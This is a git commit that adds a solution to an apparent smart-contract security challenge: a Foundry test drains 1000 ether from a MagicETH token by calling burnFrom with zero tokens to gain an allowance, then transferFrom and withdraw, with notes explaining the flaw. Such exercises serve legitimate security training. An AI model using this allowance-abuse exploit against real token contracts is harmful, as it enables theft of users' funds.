d3538e8f61167d4968297fbf0a5c46d6688cb131
saeta.eth <saeta@aelindao.xyz>
2023-08-07 17:45:49 -0300

    Add challenge 1 solution

--- test/Challenge1.t.sol
+++ test/Challenge1.t.sol
@@ -5,13 +5,6 @@ import "forge-std/Test.sol";
 import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";
 
 /*////////////////////////////////////////////////////////////
-//          DEFINE ANY NECESSARY CONTRACTS HERE             //
-//    If you need a contract for your hack, define it below //
-////////////////////////////////////////////////////////////*/
-
-
-
-/*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
 ////////////////////////////////////////////////////////////*/
 contract Challenge1Test is Test {
@@ -29,19 +22,34 @@ contract Challenge1Test is Test {
     }
 
     function testExploit() public {
-        vm.startPrank(whitehat, whitehat);
         /*////////////////////////////////////////////////////
         //               Add your hack below!               //
         //                                                  //
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
+        vm.startPrank(whitehat, whitehat); // act as exploiter, but send ETH to whitehat
 
-    
+        mETH.approve(exploiter, 1000 ether);
 
-        //==================================================//
+        mETH.burnFrom(exploiter, 0 ether);
+
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+
+        mETH.withdraw(1000 ether);
+
         vm.stopPrank();
 
-        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
+        assertEq(
+            whitehat.balance,
+            1000 ether,
+            "whitehat should have 1000 ether"
+        );
     }
+
+    /*
+    Notes: 
+     - The burnFrom gives anyone the ability to execute an approve method ob behalf of the token owner
+     - Burn 0 token gives approve 100% of the tokens to the msg.sender
+    */
 }
